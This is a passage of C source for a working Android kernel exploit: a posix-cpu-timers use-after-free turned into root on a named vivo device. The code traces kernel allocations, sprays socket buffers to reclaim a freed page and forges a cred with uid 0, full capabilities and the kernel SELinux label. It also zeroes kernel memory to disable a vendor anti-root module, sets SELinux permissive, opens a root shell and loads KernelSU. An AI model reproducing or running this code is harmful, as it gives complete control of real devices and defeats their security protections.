static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it.  A system allocation can take the freed page first; reaping
 * that node would treat the system page contents as an rb_node and panic.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        int pid;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst))
    {
        /* Failure paths join these threads without ever releasing the burst. */
        if (atomic_load(&g_stop_spray))
            return NULL;
        sched_yield();
    }
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    atomic_fetch_add(&g_spray_done, 1);
    return NULL;
}

static void spray_join(pthread_t *th, const int *created)
{
    for (int i = 0; i < SPRAY_THREADS; i++)
        if (created[i])
            (void)pthread_join(th[i], NULL);
}

static void close_pipe(int p[2])
{
    for (int i = 0; i < 2; i++)
        if (p[i] >= 0)
        {
            close(p[i]);
            p[i] = -1;
        }
}

static void close_timer_go(void)
{
    if (g_timer_go_w >= 0)
    {
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int created[SPRAY_THREADS] = {0};
    int ready_p[2] = {-1, -1}, ack_p[2] = {-1, -1};
    int tid_p[2] = {-1, -1}, timer_go[2] = {-1, -1};
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        close_pipe(ready_p);
        close_pipe(ack_p);
        close_pipe(tid_p);
        close_pipe(timer_go);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        close_pipe(ready_p);
        close_pipe(ack_p);
        close_pipe(tid_p);
        close_pipe(timer_go);
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    ready_p[1] = -1;
    close(ack_p[0]);
    ack_p[0] = -1;
    close(tid_p[1]);
    tid_p[1] = -1;
    close(timer_go[0]);
    timer_go[0] = -1;
    g_timer_go_w = timer_go[1];
    timer_go[1] = -1;
    char ch;
    int ready = read(ready_p[0], &ch, 1) == 1;

    close(ready_p[0]);
    ready_p[0] = -1;
    if (!ready)
    {
        logf("[-] plant%d trigger never ready; retryable\n", tag);
        close_pipe(ack_p);
        close_pipe(tid_p);
        close_timer_go();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        res->retry = 1;
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    close(ack_p[1]);
    ack_p[1] = -1;
    int etid = 0;
    int got_tid = read(tid_p[0], &etid, sizeof(etid)) == sizeof(etid);

    close(tid_p[0]);
    tid_p[0] = -1;
    if (!got_tid)
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        close_timer_go();
        logf("[-] plant%d victim not captured (recs=%d); retryable\n", tag, nrec);
        res->retry = 1;
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < 0xffffff0000000000ULL ||
            base > 0xffffffc000000000ULL)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            close_timer_go();
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d; retryable\n",
                 tag, base, ns, np, nrec);
            res->retry = 1;
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xffffffc000000000) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        close_timer_go();
        logf("[-] plant%d victim index missing (kept=%d); retryable\n", tag,
             nkeep);
        res->retry = 1;
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    g_slide = site0 - STATIC_TIMER_SITE;

    {
        size_t off = (size_t)((V & 0x1fff) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            trace_stop();
            close_timer_go();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            res->retry = 1;
            return;
        }
        if (mode == 2)
        {
            unsigned long long page = V & ~0x1fffULL;
            unsigned long long *c = (unsigned long long *)(payload + off);
            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                       0x100, 0x0};
            int fit = 0;

            if (off + CRED_REQ > 0x2000)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                trace_stop();
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                close_timer_go();
                res->retry = 1;
                return;
            }
            /*
             * The cred must not straddle a 4 KiB page inside the order-1 block.
             *
             * `off` is (V & 0x1fff) + 0x78, so a node in the last 0x40 bytes of
             * a page puts euid/egid/fsuid/fsgid in the *next* page.  All three
             * recorded runs with off=0xff0 failed to root (uid=2000/2000,
             * 0/-118) and one of them panicked.  Drawing another victim is
             * free here -- this is decided before the arm/reap, so no node has
             * been created yet.
             */
            if ((off & 0xfff) + CRED_REQ > 0x1000)
            {
                logf("[-] plant%d fake cred straddles a page off=%#zx; retryable\n",
                     tag, off);
                trace_stop();
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                close_timer_go();
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > 0x2000)
                    continue;
                if (b + 0x40 <= off || off + CRED_REQ <= b)
                {
                    blob = b;
                    fit = 1;
                    break;
                }
            }
            if (!fit)
            {
                trace_stop();
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                close_timer_go();
                res->retry = 1;
                return;
            }
            build_payload(payload, off, V + 0x78, target);
            /* rb_erase dirties uid/gid (c[1]) and leaves the erase target in
             * c[2]; the later zero writes repair both.  6.1 keeps a 4-byte
             * usage, so euid lands in c[2] as well and gets its own write. */
            c[3] = 0; /* euid/egid */
            c[4] = 0; /* fsuid/fsgid */
            if (CRED_UID_OFF == 8)
            {
                c[5] = 0; /* securebits */
                for (int i = 6; i <= 10; i++)
                    c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
            }
            else
            {
                for (int i = 5; i <= 9; i++)
                    c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
            }
            {
                size_t sec = CRED_UID_OFF == 8 ? 0x80 : 0x78;

                *(unsigned long long *)(payload + off + sec) =
                    page + blob; /* security */
                *(unsigned long long *)(payload + off + sec + 8) =
                    ROOT_USER_STATIC + g_slide;
                *(unsigned long long *)(payload + off + sec + 16) =
                    INIT_USER_NS_STATIC + g_slide;
                *(unsigned long long *)(payload + off + sec + 24) =
                    INIT_UCOUNTS_STATIC + g_slide;
                *(unsigned long long *)(payload + off + sec + 32) =
                    INIT_GROUPS_STATIC + g_slide;
            }
            /* 0 when SELinux is the only cred blob, 8 when landlock leads it. */
            *(unsigned int *)(payload + blob + SELINUX_CRED_OFF) =
                SELINUX_SID_KERNEL;
            *(unsigned int *)(payload + blob + SELINUX_CRED_OFF + 4) =
                SELINUX_SID_KERNEL;
            logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
                 tag, off, blob, page + blob);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
             "recs=%d slab_own=%d/%d base=%#llx\n",
             tag, V, V + 0x78, pfn, slab_pfn, g_slide, nrec, slab_own,
             (int)(0x2000 / TIMER_ALLOC), g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    atomic_store(&g_spray_done, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            if (pthread_create(&th[i], NULL, spray_thread, &args[i]) == 0)
                created[i] = 1;
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    if (g_timer_go_w >= 0)
    {
        ssize_t wn;
        int werr = 0;

        do
            wn = write(g_timer_go_w, "x", 1);
        while (wn < 0 && errno == EINTR);
        if (wn != 1)
            werr = errno;
        close_timer_go();
        if (wn != 1)
        {
            /*
             * No go byte reached the target, so its exec never started and no
             * stale node exists.  Reap every helper and retry.
             */
            logf("[-] plant%d timer go failed errno=%d; retryable\n", tag, werr);
            atomic_store(&g_stop_spray, 1);
            atomic_store(&g_burst2, 1);
            spray_join(th, created);
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            free(payload);
            res->retry = 1;
            return;
        }
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        spray_join(th, created);
        trace_stop();
        /*
         * The target never reached its exec, so it owns no timerqueue node:
         * reap it instead of leaking four helpers for the rest of the run.
         */
        logf("[-] plant%d no zombie; reaping and retrying\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        free(payload);
        res->retry = 1;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        spray_join(th, created);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        g_held++;
        free(payload);
        return;
    }
    atomic_store(&g_burst, 1);
    /*
     * Phase 1 is already spraying.  When the victim page is freed, release
     * phase 2 immediately; detecting the free before the allocation would
     * otherwise leave the page to the next caller.
     *
     * Once every spray thread has exhausted its writes, no allocation of ours
     * can claim the page any more, so waiting out the rest of the timeout only
     * delays the retry.  All recorded misses stayed at the full timeout; all
     * hits landed inside ~2.8 s.
     */
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
            }
            else if (!free_seen &&
                     scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                atomic_store(&g_burst2, 1);
            }
        }
        if (hit || atomic_load(&g_spray_done) >= SPRAY_THREADS)
            break;
        usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    spray_join(th, created);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            hit = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    if (!hit)
    {
        /* The page went to somebody else, so the stale node is no longer in
         * memory we control; keep the zombie and let the caller re-draw. */
        logf("[-] plant%d burst missed; holding zombie, retryable\n", tag);
        g_held++;
        res->retry = 1;
        free(payload);
        return;
    }

    usleep(1000);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)cmode, NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
        }
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
            /* poll/read failed: log why (child may have died) */
            {
                int err = errno;
                int alive = (kill(p, 0) == 0);
                logf("[!] cred hello not received alive=%d errno=%d hello=%#x\n",
                     alive, err, hello);
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

/* Safemode (GhostLock pattern: passed as command param, enforced natively
 * by the rooted child before ksud late-load). Creates
 * /data/adb/modules/<name>/disable for every installed module. */
static void run_safemode_disable(void)
{
    DIR *md = opendir("/data/adb/modules");
    int n = 0;

    if (!md)
    {
        logf("[safemode] cannot open /data/adb/modules: errno=%d\n", errno);
        return;
    }
    logf("[safemode] disabling modules under /data/adb/modules\n");
    for (;;)
    {
        struct dirent *e = readdir(md);
        char path[512];
        int fd;

        if (!e)
            break;
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, ".."))
            continue;
        snprintf(path, sizeof(path), "/data/adb/modules/%s/disable", e->d_name);
        fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd < 0)
            logf("[safemode] cannot disable %s: errno=%d\n", e->d_name, errno);
        else
        {
            close(fd);
            n++;
            logf("[safemode] disabled %s\n", e->d_name);
        }
    }
    closedir(md);
    logf("[safemode] disabled %d module(s)\n", n);
}

static int wait_child_main(const char *mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (read(3, &ch, 1) != 1)
        _exit(131);
    /*
     * Heartbeat first, and `close(3)` only afterwards.
     *
     * Every write back to the parent used to be `(void)write(...)`: with
     * SIGPIPE ignored a broken pipe returns EPIPE instead of killing the
     * child, so the child could keep running and exit 0 while the parent
     * reported "no child heartbeat".  Nothing in the log said why.  Each
     * write is checked now, and a failure is named on stdout so the parent's
     * log shows the real cause instead of a missing line.
     */
    {
        char hb = (char)0x48; /* 'H' */
        ssize_t w;

        /*
         * A short or interrupted heartbeat write would shift the framing: the
         * parent would read the first byte of the 32-byte report as a
         * heartbeat and then log a successful report as missing.  Retry the
         * single byte and, if it still fails, say so instead of continuing.
         */
        do
            w = write(4, &hb, sizeof(hb));
        while (w < 0 && errno == EINTR);
        if (w != (ssize_t)sizeof(hb))
            logf("[-] child heartbeat write failed ret=%zd errno=%d\n", w, errno);
    }
    close(3);
    int child_safemode = (ch == (char)0x53); /* 'S' = wake with safemode */

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    /*
     * Effective root is what grants capabilities, so euid==0 is the gate.
     *
     * A real uid that did not reach 0 is NOT repaired here.  `setuid(0)`
     * would rewrite the cred through commit_creds, which re-tags the task and
     * lets vr.ko's sys_exit probe kill it -- that is the whole reason the
     * direct-cred path avoids the call.  The fake path must not reintroduce it.
     * A uid that stayed at high32(A) is named below instead, so the failure is
     * visible rather than acted on.
     */
    if (rep.uid != 0)
        logf("[-] child real uid is %d (fake_uid write lost); leaving it alone "
             "to avoid re-tagging the task\n", rep.uid);
    if (rep.euid != 0)
    {
        rep.setuid_ret = -1;
        send_report(&rep, sizeof(rep), "report");
        close(4);
        logf("[-] child euid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (!strcmp(mode, "fake"))
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        pid_t w;
        (void)w;

        send_report(&rep, sizeof(rep), "report");
        close(4);

        /* Fake cred carries kernel SID + FULLCAP. Set SELinux permissive from
         * userspace too (with kernel selinux_state zero-write already done).
         * Needed for KernelSU ksud late-load. */
        {
            int enforce = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
            if (enforce >= 0)
            {
                (void)write(enforce, "0", 1);
                close(enforce);
            }
        }

        logf("[fake] child uid=%d euid=%d; KernelSU late-load\n",
             rep.uid, rep.euid);
        if (child_safemode)
            run_safemode_disable();
        /* KernelSU late-load only (V2352GA android14-6.1).
         * GhostLock-style: load GKI driver kernelsu.ko via ksud, then start ksud.
         * NO mount, NO system partition RW, NO AVB trip. Only /data/local/tmp writes. */
        {
            pid_t kw = fork();
            if (kw == 0)
            {
                char *const kav[] = {(char *)"sh",
                                     (char *)"/data/local/tmp/ksu_stage.sh", NULL};
                execve("/system/bin/sh", kav, envp);
                _exit(127);
            }
            if (kw > 0)
            {
                int kst = 0;
                waitpid(kw, &kst, 0);
                logf("[fake] ksu worker exit=%#x\n", kst);
            }
        }
        _exit(0);
    }

    /*
     * Direct-cred path: the parent has already zeroed uid/gid/euid/egid/
     * fsuid/fsgid (and cleared vr.ko's tag). If euid is already 0 we must NOT
     * call setuid(0)/setresgid(0): they re-enter commit_creds, re-tag the task,
     * and vr.ko's sys_exit probe kills us. Fall back to the setuid path only if
     * euid is somehow still non-zero.
     */
    if (rep.euid == 0)
    {
        rep.setuid_ret = 0;
        rep.setuid_errno = 0;
        logf("[child] already euid=0: skipping setuid/setresgid (vr.ko bypass)\n");
    }
    else
    {
        logf("[child] euid=%d != 0: falling back to setuid path\n", rep.euid);
        errno = 0;
        {
            long sg = syscall(SYS_setresgid, 0, 0, 0);

            logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
        }
        errno = 0;
        rep.setuid_ret = (int)syscall(SYS_setuid, 0);
        rep.setuid_errno = errno;
        logf("[child] setuid(0) ret=%d errno=%d\n",
             rep.setuid_ret, rep.setuid_errno);
    }
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    send_report(&rep, sizeof(rep), "resuid report");
    close(4);
    logf("[child] resuid=%d/%d/%d setuid_ret=%d errno=%d\n",
         rep.ruid, rep.reuid, rep.rsuid, rep.setuid_ret, rep.setuid_errno);
    if (rep.reuid != 0)
    {
        logf("[-] euid != 0 after escalation; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            char *const av[] = {(char *)"sh", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/* One zero-write plant to `target` (rb_erase writes 8 bytes of 0).  Returns 0
 * on success, -1 on failure.  Like stage_write, a retry happens only when the
 * failed attempt left no node we do not control. */
static int zero_write(unsigned long long target, const char *what,
                      unsigned char *raw)
{
    struct plant_res r;

    for (int a = 1; a <= 3; a++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] zero-write %s target=%#llx attempt=%d/3\n",
             what, target, a);
        run_plant(target, 1, 0, &r, raw);
        if (r.ok)
        {
            logf("[+] zero-write %s OK (attempt %d)\n", what, a);
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] zero-write %s FAILED (not retryable)\n", what);
            return -1;
        }
        if (a < 3)
            logf("[-] zero-write %s attempt=%d failed, retrying\n", what, a);
    }
    logf("[-] zero-write %s FAILED after 3 attempts\n", what);
    return -1;
}

/*
 * vivo vr.ko anti-root.
 *
 * Zeroing thread_info.flags (0x00) clears the 0x400 syscall-tracepoint work
 * bit and tag byte A; the 0x28 slot covers tag byte B (0x2c) and stays inside
 * thread_info (0x00-0x2f), so __state at 0x30 is untouched.
 *
 * The sys_exit tracepoint's funcs pointer is cleared last so vr's termination
 * probe stops firing for ANY task, including the KernelSU helpers spawned later.
 *
 * This used to also plant a write to panic_on_warn.  That is not worth a plant:
 * timerqueue_del WARNs during release_task(), i.e. when the *first* plant's
 * target is reaped, so on a kernel with panic_on_warn=1 the run is already lost
 * before the disarm write could land.  On this device the sysctl reads -1
 * (SELinux denies it) and the boot WARNs prove it is 0.  Each plant costs one
 * stale node and one WARN, so the write is gone and only the tags remain.
 */
static void defeat_vr(unsigned long long task, unsigned char *raw, pid_t child)
{
    (void)child;
    if (!is_kernel_ptr(task))
    {
        logf("[-] vr de-tag: bad task=%#llx, skipped\n", task);
        return;
    }
    logf("[+] vr de-tag: task=%#llx (flags -> tagB -> tp)\n", task);

    zero_write(task + 0x00, "vr-flags", raw);
    zero_write(task + 0x28, "vr-tagB", raw);
    if (g_slide)
        zero_write(TP_SYS_EXIT_STATIC + g_slide + TRACEPOINT_FUNCS_OFF,
                   "vr-sys-exit-funcs", raw);
    else
        logf("[!] vr de-tag: no KASLR slide, sys_exit kill path left intact\n");
    logf("[+] vr de-tag done (tags A+B cleared, sys_exit kill disabled)\n");
}

/* The fake payload writes fixed-width uid/euid pairs and a five-entry
 * capability block, so only the two cred layouts the 6.1/6.6 profiles ship
 * are safe to synthesize. */
static int fake_layout_supported(void)
{
    if (CRED_UID_OFF == 4)
        return (CRED_REQ == 0xb0 || CRED_REQ == 0xb8) && CRED_ALLOC == 0xc0;
    if (CRED_UID_OFF == 8)
        return CRED_REQ == 0xb8 && CRED_ALLOC == 0xc0;
    return 0;
}

static void usage(const char *prog)
{
    printf("CVE-2026-98260 posix-cpu-timers UAF -> uid 0  (arm64)\n");
    printf("target: 6.1.145-android14-11-maybe-dirty (V2352GA)\n");
    printf("\nusage: %s <mode> [args]\n\n", prog);
    printf("modes:\n");
    printf("  (default)      verify: zero cred uid/gid fields -> uid 0 shell (u:r:shell:s0)\n");
    printf("  verify         same as default (prints ROOT_SHELL_OK on success)\n");
    printf("  shell          interactive root shell (shell-domain, bounding-set caps only)\n");
    printf("  fake           full-capability fake cred + SELinux off + KernelSU late-load\n");
    printf("  leak           leak child cred + task only, then exit (no escalation)\n");
    printf("  ids            portable OS diag (no UAF): sysinfo/slab + timer/cred/task hists + base preview\n");
    printf("  cpu <n>        pin to CPU <n>  (e.g. %s cpu 2 shell)\n", prog);
    printf("  wait <m>       internal child mode (not for direct use)\n");
    printf("  --help | -h    this help\n");
    printf("\nnotes:\n");
    printf("  - run as shell (uid 2000) with /sys/kernel/tracing access\n");
    printf("  - REBOOT is the only clean cleanup (parks zombies / SELinux permissive)\n");
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    /* A helper pipe can lose its reader when the system kills a target. */
    signal(SIGPIPE, SIG_IGN);
    snprintf(g_helper_name, sizeof(g_helper_name), "tzh-%d", getpid());
    g_completion_path = getenv("TIMERZ9_COMPLETION_PATH");
    if (g_completion_path)
        atexit(finish_run);

    if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h") ||
                     !strcmp(argv[1], "help")))
    {
        usage(argv[0]);
        return 0;
    }

    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify");

    /*
     * Identity probe.  The app stages the binary over whatever a previous run
     * left behind, and that copy can be older; printing a build tag lets the
     * log show which build actually ran.  Everything here is kernel-agnostic.
     */
    if (argc > 1 && !strcmp(argv[1], "build"))
    {
        logf("timer build %s\n", TIMER_BUILD_TAG);
        logf("timer profile %s\n", TIMER_PROFILE);
        return 0;
    }

    if (argc > 1 && !strcmp(argv[1], "shell"))
        shell_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;
    if (argc > 1 && !strcmp(argv[1], "ids"))
        ids_only = 1;
